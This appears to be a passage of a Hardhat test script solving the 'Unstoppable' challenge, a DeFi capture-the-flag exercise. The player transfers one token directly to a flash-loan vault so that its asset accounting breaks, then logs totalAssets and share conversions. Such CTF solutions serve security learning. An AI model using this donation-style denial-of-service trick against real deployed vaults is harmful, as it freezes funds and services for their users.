...
describe("[Challenge] Unstoppable", function () {
  ...
  it("Execution", async function () {
    ...
    const unstoppableVault_Player = await vault.connect(player);
    const token_Player = await token.connect(player);
    const maxFlashLoan_view = await unstoppableVault_Player.maxFlashLoan(
      token.address
    );
    console.log("max loan", maxFlashLoan_view.toString() / 1e18);

    // Transfer one token to the vault address
    await token_Player.transfer(vault.address, ethers.utils.parseEther("1"));

    console.log(
      "Total Assets:",
      (await unstoppableVault_Player.totalAssets()).toString() / 1e18
    );
    let supply = await unstoppableVault_Player.totalSupply();
    console.log(
      "convert to share:",
      (await unstoppableVault_Player.convertToShares(supply)).toString() / 1e18
    );
